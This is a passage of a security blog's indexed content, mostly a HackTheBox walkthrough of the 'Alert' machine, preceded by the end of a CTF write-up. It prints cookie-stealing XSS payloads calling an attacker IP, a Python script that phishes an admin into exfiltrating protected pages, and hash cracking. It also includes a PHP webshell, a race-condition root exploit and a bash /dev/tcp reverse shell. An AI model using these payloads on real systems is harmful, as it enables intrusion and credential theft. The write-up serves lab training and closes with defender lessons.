./exploit.py &#34;94.237.53.227:58688&#34; This doesn&rsquo;t cause the Flask target to hang, but we do see the connection via our Pinggy terminal:
And our reverse shell listener responds! Since I&rsquo;m getting a little &ldquo;dumb shell gibberish&rdquo;, I&rsquo;ll do a tiny upgrade:
python3 -c &#39;import pty; pty.spawn(&#34;/bin/ash&#34;)&#39; # [ctrl+z] stty echo -raw; fg # [enter] cat /app/flag.txt That&rsquo;s all! &#x1f389;
That challenge wasn&rsquo;t bad at all, once I got past the whole &ldquo;there should randomly be no space between two words in the SQLi&rdquo; thing.
`,url:"https://4wayhandshake.github.io/ctf/c-o-p/"},"https://4wayhandshake.github.io/walkthrough/alert/":{title:"Alert",tags:["Markdown","XSS","Phishing","CSRF","Password Cracking","Inotifywait","Race Condition"],categories:["Walkthrough","HTB","Linux","Easy"],content:`INTRODUCTION Alert was released between seasons 6 and 7. I came to Alert after a substantial hiatus, and I&rsquo;m glad I did! It was pretty fun. Even though it is marked as Easy, I found the foothold challenging. Privesc to root was also very pleasant, albeit quick.
Recon is pretty simple on this one. Most of what we need can be obtained through a scan for subdomains and a crawl of the main website. Early on, we discover a subdomain that is hiding behind http-basic-auth, which is a hint that there may be either XSS required or credentials to obtain.
Foothold is the majority of Alert. The name of the box is a hint that it requires a little XSS. That being said, it&rsquo;s not your typical &ldquo;Easy box&rdquo; XSS situation - be prepared for a more circuitous strategy that requires two exploits to be chained. The author of this box did a great job designing foothold: (almost) every piece of both websites you see becomes an integral piece of the path towards foothold. Knowledge of the HTTP server framework will be useful here. Like many Easy boxes, once you achieve code execution, you can obtain the User flag without any pivot or escalation.
Privilege escalation to Root was very easy to identify. A typical privilege escalation checklist will quickly point out the vulnerable aspect of the box. Some may find the vulnerability a little difficult to exploit at first, but don&rsquo;t worry - all you need to do is be faster than your target! Scripting a solution (even as a one-liner) will net you the root flag.
Alert was a very interesting box, and well-designed. Personally, foothold required a bit of learning and analysis to figure out. I would recommend this box for anyone keen on web app vulnerabilities.
RECON nmap scans Port scan For this box, I&rsquo;m running my typical enumeration strategy. I set up a directory for the box, with a nmap subdirectory. Then set $RADDR to the target machine&rsquo;s IP, and scanned it with a simple but broad port scan:
sudo nmap -p- -O --min-rate 1000 -oN nmap/port-scan-tcp.txt $RADDR PORT STATE SERVICE 22/tcp open ssh 80/tcp open http 12227/tcp filtered unknown Script scan To investigate a little further, I ran a script scan over the TCP ports I just found:
TCPPORTS=\`grep &#34;^[0-9]\\+/tcp&#34; nmap/port-scan-tcp.txt | sed &#39;s/^\\([0-9]\\+\\)\\/tcp.*/\\1/g&#39; | tr &#39;\\n&#39; &#39;,&#39; | sed &#39;s/,$//g&#39;\` sudo nmap -sV -sC -n -Pn -p$TCPPORTS -oN nmap/script-scan-tcp.txt $RADDR 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 7e:46:2c:46:6e:e6:d1:eb:2d:9d:34:25:e6:36:14:a7 (RSA) | 256 45:7b:20:95:ec:17:c5:b4:d8:86:50:81:e0:8c:e8:b8 (ECDSA) |_ 256 cb:92:ad:6b:fc:c8:8e:5e:9f:8c:a2:69:1b:6d:d0:f7 (ED25519) 80/tcp open http Apache httpd 2.4.41 ((Ubuntu)) |_http-title: Did not follow redirect to http://alert.htb/ |_http-server-header: Apache/2.4.41 (Ubuntu) 12227/tcp filtered unknown Vuln scan Now that we know what services might be running, I&rsquo;ll do a vulnerability scan:
sudo nmap -n -Pn -p$TCPPORTS -oN nmap/vuln-scan-tcp.txt --script &#39;safe and vuln&#39; $RADDR No meaningful results.
UDP scan To be thorough, I also did a scan over the common UDP ports:
sudo nmap -sUV -T4 -F --version-intensity 0 -oN nmap/port-scan-udp.txt $RADDR No results from the UDP scan.
Webserver Strategy Noting the redirect from the nmap scan, I added alert.htb to /etc/hosts and did banner grabbing on that domain:
DOMAIN=alert.htb echo &#34;$RADDR $DOMAIN&#34; | sudo tee -a /etc/hosts whatweb --aggression 3 http://$DOMAIN &amp;&amp; curl -IL http://$RADDR Subdomain enumeration Next I&rsquo;ll perform vhost and subdomain enumeration. First, I&rsquo;ll check for alternate hosts:
WLIST=&#34;/usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt&#34; ffuf -w $WLIST -u http://$RADDR/ -H &#34;Host: FUZZ.htb&#34; -c -t 60 -o fuzzing/vhost-root.md -of md -timeout 4 -ic -ac -v No results. Next I&rsquo;ll check for subdomains of alert.htb
ffuf -w $WLIST -u http://$RADDR/ -H &#34;Host: FUZZ.$DOMAIN&#34; -c -t 60 -o fuzzing/vhost-$DOMAIN.md -of md -timeout 4 -ic -ac -v We found statistics.alert.htb as well! We will at this to /etc/hosts:
echo &#34;$RADDR $DOMAIN&#34; | sudo tee -a /etc/hosts Directory enumeration First, let&rsquo;s check directories of alert.htb:
WLIST=/usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-small.txt ffuf -w $WLIST:FUZZ -u http://$DOMAIN/FUZZ -t 60 -ic -c -o fuzzing/ffuf-directories-root -of json -timeout 4 -v Next we will perform directory enumeration on statistics.alert.htb:
WLIST=/usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-small.txt ffuf -w $WLIST:FUZZ -u http://statistics.$DOMAIN/FUZZ -t 60 -ic -c -o fuzzing/ffuf-directories-statistics -of json -timeout 4 -v But there were no results.
Exploring the Website The website appears to have some kind of file upload feature that allows us to view markdown files. Here&rsquo;s the landing page, also the Markdown Viewer tab:
Something I noticed right away is the address bar:
http://alert.htb/index.php/?page=alert &#x261d;&#xfe0f; Often, when we can load a particular page based on a URL querystring, this is a dead giveaway for local file inclusion (LFI), but we can easily test that later.
Note that, if it is actually an LFI, the server is trimming off the file extension (does that mean it always assumes PHP? that would be great for us)
Page enumeration Let&rsquo;s see if there are any pages we don&rsquo;t yet know about:
WLIST=/usr/share/wordlists/dirs-and-files.txt ffuf -w $WLIST -u &#34;http://$DOMAIN/index.php?page=FUZZ&#34; -c -t 60 -timeout 4 -ic -ac There&rsquo;s no obvious link to messages that I saw, but that page seems empty anyway.
Contact Us is at /index.php?page=contact; it seems like a pretty normal contact form.
About Us is at /index.php?page=about. It contains a message that seems like it hints at a possible XSS:
Hello! We are Alert. Our service gives you the ability to view MarkDown. We are reliable, secure, fast and easy to use. If you experience any problems with our service, please let us know. Our administrator is in charge of reviewing contact messages and reporting errors to us, so we strive to resolve all issues within 24 hours. Thank you for using our service!
&#x1f62e; Aha! The administrator, you say? Sounds like a good opportunity for some phishing, and maybe XSS&hellip; perhaps we can grab their credentials or a session cookie? I&rsquo;ll check for that after I look at file upload vulnerabilities &#x1f6a9;
Donate doesn&rsquo;t seem like it does much. There is a form we can fill out, with a single numerical value.
File Upload Vulnerability &#x1f6ab; This section provided some interesting info on the target, but did not progress us towards a solution. If you&rsquo;re short on time, please feel free to skip to the [next section](Markdown XSS).
We can select a file, then upload it. Upon uploading a regular, valid markdown file, we can see that it renders normally:
# THIS IS MY TITLE &gt; here is a quote This is a [link to my attacker http server](http://10.10.14.5:8000) ...And finally here&#39;s some \`oddly\` *formatted* **text**. --- However, the link at the bottom is more interesting&hellip; We can see that the server shows us exactly where the file was uploaded to!
&#x1f4aa; Having a way to consistently know the file upload location gets us one step closer to exploiting a file upload vulnerability!
The file upload also seems perfectly happy to handle a PHP file, as long as it has a .md file extension:
This simple fact tells us that they&rsquo;re not checking the MIME type of the uploaded file, or the file magic bytes. The upload logic is only based on file extension.
File Extension Enumeration First, I&rsquo;ll make a wordlist. Starting with this one from PayloadAllTheThings, I subsituted all of the image-related filetypes out for md, then ran it through sort -u to remove duplicates:
By the way, all the file extension testing won&rsquo;t matter if the file gets renamed to md upon upload.
Let&rsquo;s use ZAP Fuzz to test the file extensions (any fuzzer would be fine, though). I proxied the upload of my basic PHP webshell (renamed to webshell.md) then used that request as a template for Fuzz - select the filename extension, then add a wordlist-based payload at that location:
That Fuzz operation should be really fast, since it&rsquo;s only one payload and a short wordlist. We can see which operations successfully uploaded a file by sorting the results by size:
Any of the filenames that end with .md seem to work fine. By itself, this is not actionable, but it&rsquo;s good info to know.
To make sure that it wasn&rsquo;t the Content-Type header that was allowing these through, I tried changing it to application/x-httpd-php and got the exact same result.
Alternative access to the upload We saw earlier during directory enumeration that http://alert.htb/uploads exists. When we successfully upload a file, we get a link to it (from the Share Markdown button) like this:
&lt;a class=&#34;share-button&#34; href=&#34;http://alert.htb/visualizer.php?link_share=67911d87a9a8d8.93422876.md&#34; target=&#34;_blank&#34;&gt;Share Markdown&lt;/a&gt; Let&rsquo;s see if that same filename exists within the /uploads directory, just to gain some more understanding of the web app:
# This is a file that was uploaded with a PHP content-type, and .php\\x00.md file extension: curl http://alert.htb/uploads/67911fc62e7931.86589865.md -i Summary We&rsquo;ve identified two protective mechanisms for file uploads:
file extension allowlist (.md only ) There is no way that we can get PHP to &ldquo;run&rdquo; a .md file randomized filenames Not a total dealbreaker, but severely limits our options for filename bypass trickery Unfortunately, I don&rsquo;t see any way around the file extension denylist this time. If we can&rsquo;t get the target to accept an upload for a file that is not some type of PHP extension, then there is no way we will be able to plant a webshell. &#x1f44e;
Not to worry - we still have that very promising clue to investigate, the one that might be hinting at XSS. &#x1f6a9;
FOOTHOLD Markdown XSS We saw earlier that the markdown rendering tool will (as promised) render markdown - but can we also use it for XSS?
Thankfully, it is actually perfectly fine to have raw HTML inside markdown. That means we should be able to take a standard list of XSS payloads and try them inside a markdown file instead of HTML.
One of my tools, Crxss-Eyed is perfect for this. Normally, it&rsquo;s for spraying XSS payloads as POST requests used for form submissions. However, it has a very nice side-effect, in that one of the log files it produces is a list of all payloads generated.
Moreover, each payload is labelled - so if any of them work, we&rsquo;ll know which one was successful.
Here&rsquo;s the list of payloads I got from crxss-eyed:
&lt;http://10.10.14.5:8000/?payload=anglebrackets&gt; &lt;a&gt;http://10.10.14.5:8000/?payload=htmlanchortag&lt;/a&gt; &lt;script&gt;document.location=&#39;http://10.10.14.5:8000/?payload=scriptdocloc&#39;&lt;/script&gt; &lt;img src=x onerror=&#34;document.location=&#39;http://10.10.14.5:8000/?payload=imgonerrordocloc&#39;&#34;&gt; &lt;img src=x onerror=fetch(&#34;http://10.10.14.5:8000/?payload=imgonerrorfetch&#34;);&gt; &lt;style&gt;@keyframes x{}&lt;/style&gt;&lt;p style=&#34;animation-name:x&#34; onanimationstart=&#34;document.location=&#39;http://10.10.14.5:8000/?payload=cssanimation&#39;&#34;&gt;&lt;/p&gt; &lt;svg&gt;&lt;animate onbegin=&#34;document.location=&#39;http://10.10.14.5:8000/?payload=svganimation&#39;&#34; attributeName=x dur=1s&gt; &lt;style onload=&#34;document.location=&#39;http://10.10.14.5:8000/?payload=styleonload&#39;&#34;&gt;&lt;/style&gt; &lt;script&gt; new Image().src=&#34;http://10.10.14.5:8000/?payload=newimagesrc&amp;b64=&#34;+document.cookie; &lt;/script&gt; &lt;script src=&#39;http://10.10.14.5:8000/?payload=scriptsrc&amp;b64=&#39;+document.cookie&lt;/script&gt; &lt;script src=&#34;http://10.10.14.5:8000/grabcookie.js?payload=extscript&#34;&gt;&lt;/script&gt; &lt;img src=x onerror=&#34;fetch(&#34;http://10.10.14.5:8000/?payload=imgonerrorfetchcookie&amp;b64=&#34;+document.cookie);&#34;&gt; &lt;script&gt;document.location=&#39;http://10.10.14.5:8000/?payload=scriptdocloccookie&amp;b64=&#39;+document.cookie&lt;/script&gt; A few of these are actually just links, not really XSS payloads. They&rsquo;re included because, on HackTheBox, we often need to test for some kind of bot-driven interaction where the bot will blindly click links placed in from of them (simulating a successful phishing attempt)
But if we have HTML links, and this is a markdown document we&rsquo;re writing payloads into; shouldn&rsquo;t we also include all forms of markdown links? Here are some ways we can link to external resources in markdown:
Regular text. Maybe they viewer will just copy-paste the address?
Hello, please visit http://malicious.tld when you get a sec Link, which renders to a &lt;a&gt;
[my link](http://malicious.tld) Image, which renders to an &lt;img&gt;
![puppy](http://malicious.tld/puppy.png) Link Reference (typically used for stuff like footnotes)
[id]: http://malicious.tld &#34;optional title&#34; [link text][id] Image Reference
[image-id]: http://malicious.tld/puppy.png &#34;optional title&#34; ![alt text][image-id] Angle brackets sometimes render an &lt;a&gt;
&lt;http://malicious.tld&gt; Great, now let&rsquo;s cram all that into one markdown file. I&rsquo;ll remove the XSS payloads that are for cookie-stealing for now (can add them back in later if needed). This is the result, xss.md:
# Bug Report Administrator, please investigate these serious issues! **Check each link** http://10.10.14.5:8000/?payload=regularlink [link](http://10.10.14.5:8000/?payload=markdownlink) ![alttext](http://10.10.14.5:8000/?payload=markdownimage) [linkid]: http://10.10.14.5:8000/?payload=referencelink &#34;optional title&#34; [link text][linkid] [imageid]: http://10.10.14.5:8000/?payload=referenceimage &#34;optional title&#34; ![alt text][imageid] &lt;http://10.10.14.5:8000/?payload=anglebrackets&gt; &lt;a&gt;http://10.10.14.5:8000/?payload=htmlanchortag&lt;/a&gt; &lt;script&gt;document.location=&#39;http://10.10.14.5:8000/?payload=scriptdocloc&#39;&lt;/script&gt; &lt;img src=x onerror=&#34;document.location=&#39;http://10.10.14.5:8000/?payload=imgonerrordocloc&#39;&#34;&gt; &lt;img src=x onerror=fetch(&#34;http://10.10.14.5:8000/?payload=imgonerrorfetch&#34;);&gt; &lt;style&gt;@keyframes x{}&lt;/style&gt;&lt;p style=&#34;animation-name:x&#34; onanimationstart=&#34;document.location=&#39;http://10.10.14.5:8000/?payload=cssanimation&#39;&#34;&gt;&lt;/p&gt; &lt;svg&gt;&lt;animate onbegin=&#34;document.location=&#39;http://10.10.14.5:8000/?payload=svganimation&#39;&#34; attributeName=x dur=1s&gt; &lt;style onload=&#34;document.location=&#39;http://10.10.14.5:8000/?payload=styleonload&#39;&#34;&gt;&lt;/style&gt; Testing the payloads Now we have a pretty good list of basic XSS payloads and links for markdown, so let&rsquo;s test it out. First, I&rsquo;ll start up an HTTP listener (I&rsquo;ll use my simple-http-server):
sudo ufw allow from $RADDR to any port 8000 simple-server 8000 Now I&rsquo;ll submit the markdown file and see what happens:
As soon as we submit the file, the browser is redirected to my http listener (serving my toolbox). &#x1f602; Glad I spent that time making a nice list of payloads, literally the simplest one worked:
&lt;script&gt;document.location=&#39;http://10.10.14.5:8000/?payload=scriptdocloc&#39;&lt;/script&gt; All this really proves is that we can XSS ourselves though. If anyone else looks at the rendered markdown file, they&rsquo;ll also be redirected to the http listener.
For what it&rsquo;s worth, I also tried putting the contents of xss.md into the Contact Us form, but never got any hits from it.
&#x1f914; How can we get the administrator to become our XSS victim?
Since this is a really simple payload in script tags, I&rsquo;ll swap it out for something less annoying to deal with - a simple fetch() instead of a redirect:
# XSS To utilize the XSS, we insert a \`fetch()\` within script tags. Easy! &lt;script&gt;fetch(&#39;http://10.10.14.5:8000/?payload=scriptfetch&#39;)&lt;/script&gt; Administrator XSS Recall that interesting hint we saw on the About Us page:
Hello! We are Alert. Our service gives you the ability to view MarkDown. We are reliable, secure, fast and easy to use. If you experience any problems with our service, please let us know. Our administrator is in charge of reviewing contact messages and reporting errors to us, so we strive to resolve all issues within 24 hours. Thank you for using our service!
&#x1f440; Is it too weird to just try to phish them? Maybe not. The name of the box is Alert, after all - and what&rsquo;s the XSS trope? Yes, popping alert(1).
We already know that the Contact Us page is not vulnerable to XSS (well, probably). So maybe this hint is telling us something else? Maybe the correct thing is to use the Contact Us form to send the administrator to the actual XSS, which we&rsquo;ve already proven can reside in the uploaded/rendered markdown file!
I&rsquo;ll try using the Contact Us page to &ldquo;suggest&rdquo; to the administrator to go check out our uploaded file:
But&hellip; unfortunately I STILL did not receive any requests at my http listener!
At least, not until I simplified my message:
That&rsquo;s great! Unfortunately, I&rsquo;m still unable to get any cookie from the administrator &#x1f36a;
More than cookies Maybe I can use this XSS more as a CSRF, having the administrator perform a request then forwarding the response of that request over to our HTTP listener?
As an XSS payload, I&rsquo;ll ditch the simple fetch() command and instead do a two-stage request:
fetch(&#39;http://path/to/protected/resource&#39;) .then(r =&gt; r.text()) .then(t =&gt; { const b64 = btoa(new DOMParser().parseFromString(t, &#34;text/html&#34;).body.innerHTML); fetch(&#39;http://10.10.14.5:8000/?b64=&#39;+b64); }); Write a script Since it&rsquo;s been getting a little tedious using ZAP for this, I wrote a python script that does the whole process:
Adjust the javascript payload so that it requests a particular resouce Saves the javascript payload into a markdown file Uploads the markdown file to the target, parsing the response for the link to the uploaded file Use the Contact Us form to send the link to the administrator, tricking them into getting XSS&rsquo;d The payload fires, which requests a (protected) resource on the administrator&rsquo;s behalf, then forwards the response to my HTTP listener Here&rsquo;s the script, in all its glory:
#!/usr/bin/env python3 import requests import re import readline import sys timeout = 5 markdown = &#39;&#39;&#39; # XSS To utilize the XSS, we insert a \`fetch()\` within script tags. Easy! &lt;script&gt; fetch(&#39;##URL##&#39;) .then(r =&gt; r.text()) .then(t =&gt; { const b64 = btoa(new DOMParser().parseFromString(t, &#34;text/html&#34;).body.innerHTML); fetch(&#39;http://10.10.14.5:8000/?b64=&#39;+b64); }); &lt;/script&gt; &#39;&#39;&#39; headers = { &#39;User-Agent&#39;: &#39;Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0&#39;, &#39;Referer&#39;: &#39;http://alert.htb/index.php&#39; } def write_markdown(filepath, markdown): with open(filepath, &#39;wb&#39;) as f: f.write(markdown.encode(&#39;utf-8&#39;)) def upload_markdown(filepath): url = &#39;http://alert.htb/visualizer.php&#39; with open(filepath, &#39;rb&#39;) as f: files = { &#39;file&#39;: (&#39;xss.md&#39;, f, &#39;text/markdown&#39;) } response = requests.post(url, headers=headers, files=files, timeout=timeout) link = re.search(r&#39;href=&#34;http://alert.htb/visualizer\\.php\\?link_share=[0-9a-f]+\\.[0-9]+\\.md&#34;&#39;, response.text) if link: return link.group(0)[6:-1] # trim off the http:// and second &#34; quotation mark return &#34;&#34; def contact_admin(link): url = &#39;http://alert.htb/contact.php&#39; data = { &#34;email&#34;: &#34;jim@bob.htb&#34;, &#34;message&#34;: link } response = requests.post(url, data, timeout=timeout) if __name__ == &#34;__main__&#34;: while True: try: resource = input(&#34;\\n&gt;&gt; &#34;) if readline.get_history_item(readline.get_current_history_length() - 1) == resource: print(resource) md = markdown.replace(&#34;##URL##&#34;, resource) write_markdown(&#39;xss_temp.md&#39;, md) link = upload_markdown(&#39;xss_temp.md&#39;) print(link) contact_admin(link) except KeyboardInterrupt: print(&#34;Exiting...&#34;) sys.exit(0) I&rsquo;ll try it out, and see if I can access the ?page=messages page that we saw earlier (but when we visited, it was empty):
Huh? Alright. It&rsquo;s not actually empty&hellip; but it may as well be. &#x1f61e;
Once I saw that the administrator&rsquo;s messages page was different from mine, I was quite excited! But it turns out the link listed there leads to an essentially blank page.
&#x1f4a1; Take a closer look at that URL, though: http://alert.htb/messages.php?file=2024-03-10_15-48-34.txt. The querystring uses a parameter called file. Can we use this for file inclusion, therefore creating a CSRF situation?
I tried accessing this URL without the XSS and got an empty page; there is probably something special about having the administrator request the resource.
Read files Maybe we can use messages.php to load other files, too? I&rsquo;ll try /etc/passwd using a path traversal:
&#x1f44f; Alright! it worked first try.
I tried accessing \`/home/david/.ssh/id_rsa
Enumerating via CSRF There are a lot more files that might be important than just /etc/passwd. I did a bunch of checks; here&rsquo;s a summary:
File Result /etc/passwd As shown above /home/david/.ssh/
{id_rsa,id_ed25519,authorized_keys} No results. Probably running as www-data, not david /proc/self/environ None /proc/self/cmdline /usr/sbin/apache2-kstart /etc/apache2/apache2.conf Looks normal /var/www/html/alert/index.php Does not exist /var/www/alert/index.php Does not exist /etc/apache2/sites-available/000-default.conf YES! shows that sites are at /var/www/{alert.htb,statistics.alert.htb} /var/www/alert.htb/index.php Success. Shows us how the navbar filters for &ldquo;admin&rdquo; /var/www/alert.htb/messages.php Success. Shows how messages checks for files present in the ./messages directory /var/www/statistics.alert.htb/index.php Success. Gets us the &ldquo;Alert Dashboard&rdquo; page, with charts and donor info, etc /var/www/statistics.alert.htb/.htpasswd SUCCESS! Dumped the file that stores the hash for http-basic-auth That .htpasswd hash is exactly what I needed:
albert:$apr1$bMoRBJOg$igG8WBtQ1xYDTQdLjSWZQ/ &#x1f914; never seen that hash format before. Interesting
Cracking the hash I&rsquo;ll put this hash into a file and attempt to crack it:
echo &#39;albert:$apr1$bMoRBJOg$igG8WBtQ1xYDTQdLjSWZQ/&#39; &gt; loot/htpasswd.hash WLIST=/usr/share/wordlists/rockyou.txt nth -t &#39;$apr1$bMoRBJOg$igG8WBtQ1xYDTQdLjSWZQ/&#39; # MD5, md5apr, Apache MD5 likely; All are mode 1600 hashcat -m 1600 loot/htpasswd.hash $WLIST --username Within milliseconds, the hash was cracked:
Great, we now have credentials for statistics.alert.htb: albert : manchesterunited
Credential reuse Before I try anything else, I&rsquo;ll check for credential reuse. We have only one password, but know a couple usernames; we know of only statistics.alert.htb and SSH that require authentication:
Service Username Password &#x274c; statistics.alert.htb david manchesterunited &#x2705; statistics.alert.htb albert manchesterunited &#x274c; SSH david manchesterunited &#x2705; SSH albert manchesterunited Credential reuse confirmed! We now have SSH access as albert:
Alert Dashboard The website at statistics.alert.htb seems completely static, and that is has no clues. Nothing to attack here:
There is something of an Easter Egg though&hellip; Ever notice how we keep seeing the same set of names on all these @FisMatHack boxes?
USER FLAG Our new SSH connection lands us in /home/albert, adjacent to the user flag. Read it for the points:
cat user.txt ROOT FLAG Local enumeration - albert Albert can&rsquo;t sudo anything, so we likely need to pivot to david before we can go looking for privesc.
Oddly enough, albert is part of an interesting group:
id # uid=1000(albert) gid=1000(albert) groups=1000(albert),1001(management) I&rsquo;ll investigate this next &#x1f6a9;
netstat shows an internally listening service on port 8080:
Ligolo-ng Normally (since we already have SSH) I&rsquo;d access this internally-listening port 8080 by doing a local port forward with ssh -L. Today, I&rsquo;d like to try something new&hellip; ligolo-ng.
Please check out my guide on setting up and using ligolo-ng if you want more detail. If not, just know that we can use it for accessing anything internal to the target, and we access it at 240.0.0.1.
It&rsquo;s an HTTP server listening on port 8080. Navigating to it, we can see it&rsquo;s some kind of uptime monitor for other websites:
The page footer indicates that this is a web app called Website Monitor. If we follow the links, it leads to an open source tool available here.
Website Monitor We&rsquo;ve already seen the source code - it&rsquo;s a very simple PHP-driven website that can render some markdown. But where on the filesystem is it running? While trying to identify this, I stumbled across a hint in ps aux:
inotifywait -m -e modify --format %w%f %e /opt/website-monitor/config &#x1f914; So there&rsquo;s some process watching for modifications of /opt/website-monitor/config, eh?
Checking that directory, we can see it&rsquo;s definitely the right thing. It looks identical to that open source tool:
What&rsquo;s really interesting is that the config directory is under the management group, which albert is a member of!
We can make any changes we want to that directory. This explains the inotifywait we saw in ps aux: it&rsquo;s part of a cleanup script.
There&rsquo;s only one file in the directory: configuration.php. Since we&rsquo;re able to modify this file, it would be smart to check if it gets &ldquo;included&rdquo; elsewhere in the PHP application:
cd /opt/website-monitor grep -iR &#34;configuration.php&#34; ./ # ./monitor.php:include(&#39;config/configuration.php&#39;); # Binary file ./.git/index matches # ./index.php:include(&#39;config/configuration.php&#39;); Nice! It&rsquo;s included in two places, and one of them is index.php. Code execution should be easy, then. Check out the contents of configuration.php:
&lt;?php define(&#39;PATH&#39;, &#39;/opt/website-monitor&#39;); ?&gt; Yep, that&rsquo;s all it does! That PATH constant gets used all over the application, bu here&rsquo;s a sample:
Wow, perfect. The include(PATH.'Parsedown.php'); line is vulnerable to us changing the PATH by editing config/configuration.php.
Strategy We could do this to gain code execution in the context of that PHP application:
Copy the whole /opt/website-monitor directory to a place that I control Make a PHP webshell or reverse shell, and overwrite Parsedown.php in my attacker-controlled directory with that webshell/revshell Modify /opt/website-monitor/config/configuration.php to set the PATH to my attacker-controlled directory. Visit the Website monitor page, or make a cURL request to it - this will execute index.php and make it load my malicious copy of Parsedown.php Proof of Concept Let&rsquo;s start by making an attacker controlled directory and copying the code into it:
mkdir -p /tmp/.Tools/test; cd /tmp/.Tools/test wget http://10.10.14.5:8000/webshell.php cp -r /opt/website-monitor/* ./* mv webshell.php Parsedown.php The webshell is really simple:
&lt;?php if(isset($_REQUEST[&#39;cmd&#39;])){ $cmd = $_REQUEST[&#39;cmd&#39;]; echo &#34;&lt;pre&gt;$cmd&lt;/pre&gt;&lt;hr/&gt;&lt;pre&gt;&#34;; $output = system($_REQUEST[&#39;cmd&#39;], $retval); echo &#34;&lt;/pre&gt;&#34;; } else{ echo &#34;Please enter a command using the \\&#34;cmd\\&#34; parameter&#34;; } ?&gt; Now let&rsquo;s try modifying the configuration.php file from the live server:
My changes are being immediately overwritten. It looks like that inotifywait process is kicking in and replacing my changes with a backup copy of the file.
Maybe it&rsquo;s a matter of speed? Can we create a race condition?
sed -i &#39;s/\\/opt\\/website-monitor/\\/tmp\\/.Tools\\/test/g&#39; configuration.php; cat configuration.php # &lt;?php # define(&#39;PATH&#39;, &#39;/tmp/.Tools/test&#39;); # ?&gt; &#x1f602; That worked - super. Let&rsquo;s utilize the webshell in the same way, then:
sed -i &#39;s/\\/opt\\/website-monitor/\\/tmp\\/.Tools\\/test/g&#39; configuration.php; curl -s http://localhost:8080 --data &#39;cmd=touch+/tmp/t&#39; &gt; /dev/null Let&rsquo;s check if it worked:
&#x1f389; Hooray! Not only did it work perfectly, it looks like this website-monitor app is ran by the root user.
Root privesc Let&rsquo;s open a reverse shell instead of the webshell. I&rsquo;ll start a reverse shell listener:
sudo ufw allow from $RADDR to any port 4444 proto tcp bash nc -lvnp 4444 Now I&rsquo;ll modify my PoC to use a reverse shell payload. Since the payload is in x-www-form-urlencoded form data, I&rsquo;ll url-encode it:
url_encode &#39;bash -c &#34;bash -i &gt;&amp; /dev/tcp/10.10.14.5/4444 0&gt;&amp;1&#34;&#39; # bash+-c+%22bash+-i+%3E%26+%2Fdev%2Ftcp%2F10.10.14.5%2F4444+0%3E%261%22 The whole command should be like this:
sed -i &#39;s/\\/opt\\/website-monitor/\\/tmp\\/.Tools\\/test/g&#39; configuration.php; curl -s http://localhost:8080 --data &#39;cmd=bash+-c+%22bash+-i+%3E%26+%2Fdev%2Ftcp%2F10.10.14.5%2F4444+0%3E%261%22&#39; &gt; /dev/null &#x1f44f; And we catch a reverse shell!
Now we can read the flag to finish off the box &#x1f4b0;
cat /root/root.txt EXTRA CREDIT Persistence as root We have a reverse shell as root right now. I tried planting an SSH key to achieve persistence, but it looks like key-based authentication is disabled for SSH. What&rsquo;s another good way to privesc?
Well&hellip; let&rsquo;s just change the password &#x1f937;&zwj;&#x2642;&#xfe0f;
Normally, I wouldn&rsquo;t advocate doing this: it&rsquo;s a little rude other HTB players that are in the same box instance as you.
&ldquo;Why?&rdquo; you ask? Because if someone has decided to privesc by dumping the contents of /etc/shadow, then changing the root password will undo their work.
Performing the password change is as easy as it normally is:
passwd Now we might be able to just log in over SSH (disabling password-based authentication over SSH for the root user is very common security measure):
ssh root@alert.htb # password: 4wayhandshake CLEANUP Target I&rsquo;ll get rid of the spot where I place my tools, /tmp/.Tools:
rm -rf /tmp/.Tools Attacker There&rsquo;s also a little cleanup to do on my local / attacker machine. It&rsquo;s a good idea to get rid of any &ldquo;loot&rdquo; and source code I collected that didn&rsquo;t end up being useful, just to save disk space:
rm -rf ./source/website-monitor rm ./source/website-monitor.zip It&rsquo;s also good policy to get rid of any extraneous firewall rules I may have defined. This one-liner just deletes all the ufw rules:
NUM_RULES=$(($(sudo ufw status numbered | wc -l)-5)); for (( i=0; i&lt;$NUM_RULES; i++ )); do sudo ufw --force delete 1; done; sudo ufw status numbered; LESSONS LEARNED Attacker &#x1f38e; Test each part of an attack. It took me longer than I care to admit to figure out how to connect the two pieces of the website - leveraging the phishing message into XSS (then CSRF after). My time would have been better spent by trying to XSS myself and noting the protective mechanisms in-place. If I had looked for that, I would have been less fixated on session hijacking.
&#x1f52d; Let recon guide your enumeration. Even though I already knew that the subdomain was running http-basic-auth, I didn&rsquo;t immediately think to try to find the .htpasswd file. Instead, I stumbled across it while enumerating other aspects of Apache. Thankfully I realized it eventually, but it did take longer than it should have.
Defender &#x1f3d7;&#xfe0f; Use the framework. You may hear security people saying &ldquo;use a framework&rdquo; often, but what I mean is more specific: you should utilize the features of your framework to the fullest extent possible. Many more eyes have seen the framework code than your custom application, so it&rsquo;s best to use whatever the framework can provide. On this box, that means we should have used whatever File/Directory-listing solution the framework provided, instead of creating a customized file-reading page (/messages).
🥸 XSRF is easy and essential. The knee-jerk reaction for preventing CSRF attacks (like the one we leveraged into an LFI) is to apply an anti-CSRF token to each &ldquo;state-changing&rdquo; request. Our attack did not change any &ldquo;state&rdquo; in the application, but it could have been prevented by proper application of per-request anti-CSRF tokens. The server may have recognized that the request for GET /messages?file=[filename]
&#x1f407; Never rely on timing. I&rsquo;m not sure if it was meant as a cleanup script or as a defensive measure, but the inotifywait process that kept website-monitor&rsquo;s config files safe was woefully misguided. Instead of relying on one process (inotifywait) being faster than another process (whatever operation is changing the config file), the file should have had proper access control applied. The solution on the box like&hellip; if, instead of locking a door, you hire someone full-time to quickly shut the door if it ever opens - just seems silly!
